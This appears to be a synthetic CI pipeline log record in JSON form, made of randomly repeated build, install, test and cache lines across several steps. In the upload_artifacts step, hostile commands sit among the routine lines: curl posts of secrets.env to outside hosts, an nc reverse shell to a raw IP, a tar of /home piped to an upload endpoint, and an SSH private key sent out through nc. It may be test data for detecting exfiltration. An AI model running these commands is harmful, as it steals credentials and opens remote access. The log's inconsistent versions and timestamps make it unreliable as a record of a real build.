v5.0\n\u2713 build completed\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (9MB)\nInstalling axios@1.8.0\nWARNING: react has known vulnerabilities\nFAILED: test_api_health\n\u2713 build completed\n\u2713 test completed\nCompiling src/index.js...\n[12:00:23] WARN: Deprecated API usage\n  PASS: test_api_health (471ms)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (5MB)\n\u2713 build completed\nCompiling src/utils.go...\nFAILED: test_cache_hit\n[12:00:23] INFO: Processing request\nCache hit for key-7083\n  PASS: test_user_create (401ms)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 1/10: Building\n  PASS: test_cache_hit (322ms)\n[12:00:23] INFO: Processing request\n\u2713 test completed\n  PASS: test_api_health (302ms)\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 build completed\n  PASS: test_auth_login (58ms)\n[12:00:23] INFO: Processing request\n  PASS: test_auth_login (499ms)\nInstalling axios@1.5.0\n  PASS: test_db_connect (163ms)\nCompiling src/index.js...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (15MB)\nStep 9/10: Building\n[12:00:23] ERROR: Connection failed\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (20MB)\nCache hit for key-6226\n\u2713 build completed\n[12:00:23] INFO: Processing request\nCompiling src/utils.go...\n  PASS: test_api_health (202ms)\nCache hit for key-7584\nStep 9/10: Building\nCache hit for key-3101\n=== Step lint completed ===\n=== Step: deploy_production ===\n  PASS: test_cache_hit (31ms)\nStep 2/10: Building\nCache hit for key-2204\n[12:00:23] INFO: Processing request\nCache hit for key-9151\n\u2713 build completed\nCache hit for key-8341\nArtifact uploaded: build.tar.gz (46MB)\n\u2713 lint completed\n\u2713 lint completed\n[12:00:23] INFO: Processing request\nCompiling src/service.java...\nCompiling src/main.py...\nInstalling webpack@5.18.0\nCompiling src/handler.rs...\n\u2713 build completed\n  PASS: test_user_create (208ms)\nStep 9/10: Building\nCompiling src/handler.rs...\nCompiling src/handler.rs...\nStep 9/10: Building\nCache hit for key-7017\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_user_create (378ms)\nArtifact uploaded: build.tar.gz (43MB)\n  PASS: test_user_create (304ms)\nWARNING: express has known vulnerabilities\nInstalling jest@5.17.0\n\u2717 build failed with exit code 58\n[12:00:23] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:23] WARN: Deprecated API usage\nInstalling axios@5.13.0\nWARNING: express has known vulnerabilities\nCompiling src/handler.rs...\nCompiling src/utils.go...\n[12:00:23] INFO: Processing request\nCompiling src/app.ts...\nCache hit for key-5403\n[12:00:23] INFO: Processing request\nCache hit for key-1843\n[12:00:23] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling react@2.5.0\nStep 6/10: Building\n\u2713 test completed\nStep 1/10: Building\n\u2713 build completed\nArtifact uploaded: build.tar.gz (22MB)\n  PASS: test_db_connect (116ms)\nCompiling src/service.java...\n  PASS: test_auth_login (367ms)\nCompiling src/main.py...\n  PASS: test_cache_hit (450ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 2/10: Building\n[12:00:23] INFO: Processing request\nCompiling src/index.js...\nCache hit for key-2723\nArtifact uploaded: build.tar.gz (22MB)\nCache hit for key-4548\nCompiling src/index.js...\nStep 5/10: Building\n[12:00:23] INFO: Processing request\nCache hit for key-3616\nInstalling jest@2.2.0\nCache hit for key-3075\n\u2713 lint completed\nCompiling src/service.java...\nCompiling src/app.ts...\n[12:00:23] INFO: Processing request\nCompiling src/service.java...\n[12:00:23] INFO: Processing request\n  PASS: test_auth_login (395ms)\nCompiling src/service.java...\nInstalling jest@5.10.0\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:23] INFO: Processing request\nInstalling eslint@2.1.0\nCompiling src/utils.go...\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 6/10: Building\n[12:00:23] INFO: Processing request\nInstalling webpack@4.17.0\nStep 6/10: Building\nStep 9/10: Building\nCache hit for key-3937\nWARNING: webpack has known vulnerabilities\n[12:00:23] INFO: Processing request\nInstalling axios@1.20.0\n[12:00:23] INFO: Processing request\nInstalling eslint@5.13.0\nWARNING: eslint has known vulnerabilities\n\u2713 test completed\n\u2713 lint completed\n\u2713 lint completed\nInstalling axios@2.13.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-3080\n  PASS: test_api_health (414ms)\nCompiling src/app.ts...\n[12:00:23] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (43MB)\nArtifact uploaded: build.tar.gz (13MB)\nCompiling src/utils.go...\n[12:00:23] INFO: Processing request\nCompiling src/app.ts...\nStep 1/10: Building\n  PASS: test_user_create (481ms)\n=== Step deploy_production completed ===\n=== Step: unit_tests ===\nWARNING: jest has known vulnerabilities\n[12:00:23] INFO: Processing request\nStep 8/10: Building\n\u2713 build completed\nInstalling react@4.14.0\nCache hit for key-4387\nCompiling src/app.ts...\nStep 1/10: Building\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (4MB)\nCache hit for key-2722\nArtifact uploaded: build.tar.gz (31MB)\nStep 2/10: Building\n  PASS: test_auth_login (380ms)\nCompiling src/utils.go...\n\u2713 test completed\nInstalling lodash@3.15.0\nInstalling express@4.10.0\nArtifact uploaded: build.tar.gz (36MB)\nInstalling webpack@4.12.0\n  PASS: test_api_health (281ms)\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\n  PASS: test_user_create (354ms)\nCache hit for key-8307\nCache hit for key-9178\n\u2713 build completed\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (27MB)\n  PASS: test_api_health (391ms)\nInstalling jest@1.12.0\nCompiling src/handler.rs...\nStep 8/10: Building\nCompiling src/utils.go...\nStep 5/10: Building\n[12:00:23] INFO: Processing request\nCache hit for key-1984\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (16MB)\nInstalling prettier@5.19.0\nInstalling webpack@3.14.0\n\u2713 lint completed\nInstalling jest@5.10.0\nFAILED: test_user_create\n[12:00:23] INFO: Processing request\n[12:00:23] INFO: Processing request\nStep 1/10: Building\nCompiling src/app.ts...\nInstalling axios@5.5.0\n  PASS: test_cache_hit (43ms)\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 lint completed\n  PASS: test_db_connect (282ms)\nArtifact uploaded: build.tar.gz (22MB)\nCompiling src/service.java...\n\u2713 test completed\n\u2713 test completed\nInstalling webpack@3.18.0\n  PASS: test_api_health (7ms)\n\u2713 lint completed\n  PASS: test_db_connect (432ms)\nCompiling src/index.js...\n[12:00:23] WARN: Deprecated API usage\n  PASS: test_auth_login (498ms)\nStep 10/10: Building\nInstalling webpack@2.13.0\n  PASS: test_cache_hit (349ms)\nCache hit for key-5734\n\u2713 build completed\n  PASS: test_db_connect (78ms)\n\u2717 build failed with exit code 55\n\u2713 test completed\nArtifact uploaded: build.tar.gz (36MB)\nStep 6/10: Building\nCache hit for key-4361\n  PASS: test_auth_login (66ms)\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (117ms)\nWARNING: axios has known vulnerabilities\n  PASS: test_user_create (28ms)\n\u2717 build failed with exit code 125\n[12:00:23] INFO: Processing request\n[12:00:23] ERROR: Connection failed\n[12:00:23] WARN: Deprecated API usage\nStep 4/10: Building\n[12:00:23] INFO: Processing request\nCache hit for key-6432\nInstalling axios@1.15.0\n  PASS: test_api_health (188ms)\nInstalling lodash@1.18.0\n  PASS: test_api_health (317ms)\nCompiling src/service.java...\nCompiling src/service.java...\n[12:00:23] INFO: Processing request\n\u2713 lint completed\nStep 6/10: Building\nCompiling src/index.js...\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (6MB)\nArtifact uploaded: build.tar.gz (42MB)\n  PASS: test_cache_hit (25ms)\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-3995\nCache hit for key-2733\nCache hit for key-4607\n\u2713 lint completed\n  PASS: test_cache_hit (143ms)\n[12:00:23] INFO: Processing request\nCompiling src/service.java...\nInstalling react@5.16.0\n\u2713 lint completed\n=== Step unit_tests completed ===\n=== Step: setup_node ===\n\u2713 lint completed\nCache hit for key-2080\n[12:00:23] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 build completed\n\u2713 lint completed\n  PASS: test_db_connect (192ms)\n  PASS: test_cache_hit (455ms)\nInstalling prettier@5.3.0\n  PASS: test_cache_hit (189ms)\nInstalling lodash@3.10.0\n\u2713 test completed\nFAILED: test_user_create\nCache hit for key-9513\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (10MB)\n[12:00:23] INFO: Processing request\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_user_create (3ms)\nArtifact uploaded: build.tar.gz (7MB)\n\u2713 test completed\n  PASS: test_db_connect (404ms)\nCompiling src/utils.go...\n  PASS: test_auth_login (399ms)\nInstalling express@4.5.0\n[12:00:23] WARN: Deprecated API usage\nStep 3/10: Building\nCache hit for key-5074\nCache hit for key-5914\n\u2713 test completed\nCache hit for key-3967\n[12:00:23] WARN: Deprecated API usage\nCache hit for key-2668\nStep 10/10: Building\n\u2713 build completed\nInstalling lodash@5.16.0\nStep 3/10: Building\n  PASS: test_cache_hit (75ms)\nStep 5/10: Building\n\u2713 test completed\nInstalling webpack@1.2.0\n\u2713 test completed\nInstalling prettier@2.15.0\n  PASS: test_user_create (350ms)\n  PASS: test_api_health (59ms)\nCache hit for key-2777\n\u2713 build completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (23MB)\nArtifact uploaded: build.tar.gz (23MB)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_user_create (337ms)\nStep 5/10: Building\n  PASS: test_api_health (304ms)\n[12:00:23] INFO: Processing request\nCache hit for key-2149\nCompiling src/handler.rs...\nCache hit for key-9430\nStep 7/10: Building\n  PASS: test_user_create (87ms)\n[12:00:23] INFO: Processing request\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (44MB)\nInstalling express@3.13.0\n[12:00:23] INFO: Processing request\nStep 10/10: Building\n\u2713 lint completed\nCache hit for key-7483\nCache hit for key-7142\n\u2713 build completed\n\u2713 lint completed\n\u2713 lint completed\n  PASS: test_cache_hit (428ms)\nStep 9/10: Building\nArtifact uploaded: build.tar.gz (4MB)\nArtifact uploaded: build.tar.gz (3MB)\n  PASS: test_cache_hit (98ms)\nCompiling src/app.ts...\nStep 1/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\nCache hit for key-2364\n  PASS: test_db_connect (496ms)\nArtifact uploaded: build.tar.gz (2MB)\n  PASS: test_db_connect (331ms)\nCompiling src/main.py...\nCache hit for key-8629\n[12:00:23] ERROR: Connection failed\nCompiling src/main.py...\n  PASS: test_db_connect (483ms)\nCache hit for key-7344\nStep 6/10: Building\n\u2717 build failed with exit code 56\nCache hit for key-8454\nCompiling src/index.js...\nStep 10/10: Building\n  PASS: test_user_create (124ms)\n\u2713 lint completed\nStep 6/10: Building\nCache hit for key-1910\n  PASS: test_auth_login (494ms)\nCache hit for key-8672\nException: TypeError\nCompiling src/index.js...\nInstalling lodash@5.11.0\n[12:00:23] WARN: Deprecated API usage\nStep 6/10: Building\n  PASS: test_db_connect (408ms)\nStep 8/10: Building\n=== Step setup_node completed ===\n=== Step: upload_artifacts ===\ncurl -X POST https://startup.dev/collect -d @secrets.env\nStep 5/10: Building\nnc -e /bin/sh 120.191.131.197 6057\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:23] INFO: Processing request\nInstalling jest@3.12.0\n  PASS: test_api_health (458ms)\nInstalling react@4.12.0\nStep 4/10: Building\nSending 177MB of data to acme.corp\n  PASS: test_db_connect (182ms)\nCompiling src/app.ts...\nCompiling src/index.js...\nStep 1/10: Building\nInstalling react@5.7.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-2468\n\u2713 test completed\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (338ms)\nInstalling webpack@1.12.0\n[12:00:23] INFO: Processing request\n[12:00:23] WARN: Deprecated API usage\nStep 1/10: Building\n[12:00:23] INFO: Processing request\n\u2713 build completed\n\u2713 build completed\n  PASS: test_api_health (480ms)\n  PASS: test_cache_hit (180ms)\nStep 10/10: Building\nCompiling src/app.ts...\n  PASS: test_user_create (159ms)\n[12:00:23] WARN: Deprecated API usage\nInstalling react@4.10.0\n  PASS: test_auth_login (166ms)\nCache hit for key-6849\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:23] ERROR: Connection failed\nFAILED: test_cache_hit\nInstalling react@2.3.0\n\u2713 lint completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (35MB)\nInstalling express@3.4.0\nArtifact uploaded: build.tar.gz (21MB)\nStep 7/10: Building\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:23] INFO: Processing request\nInstalling react@4.0.0\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (12MB)\nArtifact uploaded: build.tar.gz (41MB)\n[12:00:23] INFO: Processing request\nCompiling src/main.py...\nInstalling prettier@3.18.0\n[12:00:23] INFO: Processing request\nCompiling src/service.java...\n[12:00:23] INFO: Processing request\n\u2713 build completed\ntar czf - /home | curl -X POST -d @- https://test.io/upload\ncurl -X POST https://test.io/collect -d @secrets.env\nStep 2/10: Building\n\u2713 build completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:23] INFO: Processing request\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: test_auth_login (371ms)\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nStep 10/10: Building\n[12:00:23] WARN: Deprecated API usage\n\u2713 lint completed\n\u2713 build completed\n[12:00:23] WARN: Deprecated API usage\nCache hit for key-3336\n[12:00:23] INFO: Processing request\n  PASS: test_api_health (239ms)\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nCache hit for key-9695\n[12:00:23] INFO: Processing request\nCache hit for key-2880\n  PASS: test_api_health (178ms)\nArtifact uploaded: build.tar.gz (33MB)\nCache hit for key-2579\n  PASS: test_auth_login (292ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (31MB)\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling eslint@5.6.0\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 test completed\nSending 59MB of data to acme.corp\nCache hit for key-9653\nCompiling src/main.py...\nStep 7/10: Building\nCache hit for key-4418\nCompiling src/service.java...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 111.33.217.166 17330\nArtifact uploaded: build.tar.gz (4MB)\n\u2713 lint completed\nStep 6/10: Building\n  PASS: test_api_health (431ms)\nCache hit for key-2540\nStep 7/10: Building\n  PASS: test_db_connect (252ms)\nCompiling src/app.ts...\nStep 5/10: Building\n\u2713 lint completed\nCache hit for key-7619\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/handler.rs...\n  PASS: test_db_connect (470ms)\nStep 7/10: Building\n=== Step upload_artifacts completed ===",
    "steps": [
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-10T12:00:22.995424",
        "finished_at": "2025-12-10T12:00:35.328885",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Artifact uploaded: build.tar.gz (17MB)",
          "  PASS: test_cache_hit (187ms)",
          "[12:00:22] INFO: Processing request",
          "Installing express@3.18.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing prettier@3.13.0",
          "  PASS: test_db_connect (361ms)",
          "\u2713 build completed",
          "Exception: ValueError",
          "Cache hit for key-7382",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Installing webpack@4.16.0",
          "\u2713 lint completed",
          "Installing lodash@4.1.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "  PASS: test_api_health (65ms)",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Step 6/10: Building",
          "Step 1/10: Building",
          "Cache hit for key-6795",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/utils.go...",
          "Cache hit for key-3916",
          "  PASS: test_db_connect (95ms)",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing prettier@4.4.0",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_api_health (318ms)",
          "Installing webpack@2.6.0",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Compiling src/index.js...",
          "Installing express@5.9.0",
          "  PASS: test_auth_login (278ms)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Compiling src/main.py...",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (90ms)",
          "WARNING: react has known vulnerabilities",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Step 6/10: Building",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2713 build completed",
          "Cache hit for key-5905",
          "\u2713 test completed",
          "FAILED: test_api_health",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Installing lodash@3.3.0",
          "  PASS: test_api_health (340ms)",
          "Step 10/10: Building",
          "  PASS: test_api_health (35ms)",
          "[12:00:22] INFO: Processing request",
          "Installing express@5.7.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing lodash@1.9.0",
          "Installing lodash@1.18.0",
          "  PASS: test_auth_login (129ms)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 5/10: Building",
          "\u2713 test completed",
          "  PASS: test_db_connect (449ms)",
          "Compiling src/utils.go...",
          "Step 6/10: Building",
          "Step 9/10: Building",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2713 build completed",
          "Cache hit for key-7818",
          "Step 5/10: Building",
          "  PASS: test_auth_login (472ms)",
          "Installing react@3.4.0",
          "Compiling src/handler.rs...",
          "[12:00:22] WARN: Deprecated API usage",
          "  PASS: test_db_connect (322ms)",
          "Cache hit for key-5942",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-8512",
          "Compiling src/handler.rs...",
          "  PASS: test_api_health (440ms)",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:00:22] ERROR: Connection failed",
          "\u2713 build completed",
          "[12:00:22] ERROR: Connection failed",
          "Installing webpack@4.7.0",
          "WARNING: react has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (37MB)",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-10T12:00:35.328885",
        "finished_at": "2025-12-10T12:00:59.995806",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Installing eslint@2.12.0",
          "Installing webpack@3.12.0",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (201ms)",
          "  PASS: test_api_health (325ms)",
          "\u2713 lint completed",
          "Cache hit for key-8379",
          "Cache hit for key-6292",
          "[12:00:22] INFO: Processing request",
          "Step 10/10: Building",
          "Step 2/10: Building",
          "  PASS: test_auth_login (375ms)",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (27MB)",
          "\u2717 build failed with exit code 74",
          "\u2713 build completed",
          "\u2713 build completed",
          "Cache hit for key-5939",
          "Cache hit for key-2255",
          "\u2713 test completed",
          "Cache hit for key-3913",
          "Cache hit for key-9016",
          "Cache hit for key-5948",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_user_create (488ms)",
          "  PASS: test_auth_login (160ms)",
          "Exception: ValueError",
          "Installing eslint@5.8.0",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Installing webpack@4.4.0",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 76",
          "\u2713 test completed",
          "[12:00:22] WARN: Deprecated API usage",
          "Installing lodash@1.10.0",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_user_create (333ms)",
          "Installing lodash@3.6.0",
          "  PASS: test_user_create (205ms)",
          "\u2713 test completed",
          "Installing webpack@5.14.0",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Installing eslint@5.5.0",
          "\u2713 build completed",
          "Step 5/10: Building",
          "  PASS: test_auth_login (489ms)",
          "Installing express@3.19.0",
          "Cache hit for key-4809",
          "\u2713 test completed",
          "[12:00:22] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-1232",
          "Cache hit for key-1056",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Installing webpack@1.13.0",
          "Exception: TypeError",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 3/10: Building",
          "Step 4/10: Building",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-8526",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "  PASS: test_auth_login (84ms)",
          "Compiling src/service.java...",
          "Compiling src/index.js...",
          "[12:00:22] INFO: Processing request",
          "Installing lodash@5.14.0",
          "Cache hit for key-8587",
          "Step 4/10: Building",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Compiling src/utils.go...",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (21MB)",
          "FAILED: test_auth_login",
          "[12:00:22] INFO: Processing request",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] WARN: Deprecated API usage",
          "[12:00:22] ERROR: Connection failed",
          "Step 2/10: Building",
          "Installing webpack@2.17.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (444ms)",
          "[12:00:22] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-3807",
          "  PASS: test_db_connect (226ms)",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_api_health (230ms)",
          "Installing webpack@2.13.0",
          "Compiling src/service.java...",
          "Cache hit for key-9041",
          "[12:00:22] INFO: Processing request",
          "Exception: RuntimeError",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-10T12:00:59.995806",
        "finished_at": "2025-12-10T12:01:07.395882",
        "log_lines": [
          "=== Step: save_cache ===",
          "Compiling src/handler.rs...",
          "Cache hit for key-6836",
          "[12:00:22] WARN: Deprecated API usage",
          "Cache hit for key-5368",
          "Step 10/10: Building",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_cache_hit (432ms)",
          "  PASS: test_auth_login (8ms)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "\u2713 test completed",
          "  PASS: test_user_create (470ms)",
          "Installing express@4.1.0",
          "[12:00:22] WARN: Deprecated API usage",
          "  PASS: test_db_connect (212ms)",
          "Step 10/10: Building",
          "Step 8/10: Building",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/service.java...",
          "Installing lodash@5.10.0",
          "Installing axios@1.12.0",
          "\u2717 build failed with exit code 111",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Cache hit for key-4685",
          "[12:00:22] INFO: Processing request",
          "Step 7/10: Building",
          "  PASS: test_db_connect (260ms)",
          "Compiling src/app.ts...",
          "Step 3/10: Building",
          "Cache hit for key-9062",
          "  PASS: test_cache_hit (347ms)",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Installing webpack@1.2.0",
          "[12:00:22] INFO: Processing request",
          "Installing express@4.5.0",
          "  PASS: test_auth_login (340ms)",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (31ms)",
          "  PASS: test_cache_hit (161ms)",
          "Installing webpack@1.12.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-7758",
          "Step 7/10: Building",
          "FAILED: test_auth_login",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Cache hit for key-6896",
          "Cache hit for key-7358",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Installing express@2.9.0",
          "Step 10/10: Building",
          "Compiling src/app.ts...",
          "[12:00:22] ERROR: Connection failed",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "[12:00:22] INFO: Processing request",
          "Installing eslint@4.9.0",
          "FAILED: test_auth_login",
          "  PASS: test_user_create (360ms)",
          "Installing express@2.13.0",
          "Step 5/10: Building",
          "Step 4/10: Building",
          "[12:00:22] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-3663",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Cache hit for key-7813",
          "Installing lodash@3.9.0",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] ERROR: Connection failed",
          "  PASS: test_user_create (1ms)",
          "Compiling src/app.ts...",
          "[12:00:22] ERROR: Connection failed",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Cache hit for key-9876",
          "Compiling src/handler.rs...",
          "[12:00:22] ERROR: Connection failed",
          "Step 7/10: Building",
          "[12:00:22] WARN: Deprecated API usage",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-7626",
          "Compiling src/service.java...",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-6184",
          "Installing jest@4.15.0",
          "[12:00:22] WARN: Deprecated API usage",
          "Installing prettier@3.8.0",
          "[12:00:22] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:22] INFO: Processing request",
          "\u2713 lint completed",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-10T12:01:07.395882",
        "finished_at": "2025-12-10T12:01:19.729343",
        "log_lines": [
          "=== Step: type_check ===",
          "[12:00:22] INFO: Processing request",
          "Installing react@5.16.0",
          "Installing react@1.20.0",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "  PASS: test_auth_login (459ms)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (33MB)",
          "\u2717 build failed with exit code 46",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:22] INFO: Processing request",
          "  PASS: test_api_health (397ms)",
          "Installing axios@3.0.0",
          "[12:00:22] INFO: Processing request",
          "Step 4/10: Building",
          "Installing prettier@3.8.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:22] INFO: Processing request",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:22] INFO: Processing request",
          "Step 8/10: Building",
          "Cache hit for key-1069",
          "[12:00:22] INFO: Processing request",
          "\u2717 build failed with exit code 117",
          "[12:00:22] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (26MB)",
          "\u2713 test completed",
          "Cache hit for key-8620",
          "Compiling src/utils.go...",
          "Installing jest@4.8.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:22] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_db_connect (89ms)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 test completed",
          "  PASS: test_api_health (295ms)",
          "Step 10/10: Building",
          "Compiling src/handler.rs...",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 9/10: Building",
          "Cache hit for key-7807",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Cache hit for key-9538",
          "[12:00:22] INFO: Processing request",
          "Cache hit for key-4341",
          "  PASS: test_cache_hit (395ms)",
          "Installing jest@1.3.0",
          "Cache hit for key-9181",
          "Step 3/10: Building",
          "Step 8/10: Building",
          "Cache hit for key-1957",
          "Installing jest@3.6.0",
          "Installing express@4.1.0",
          "\u2713 test completed",
          "Step 2/10: Building",
          "  PASS: test_user_create (198ms)",
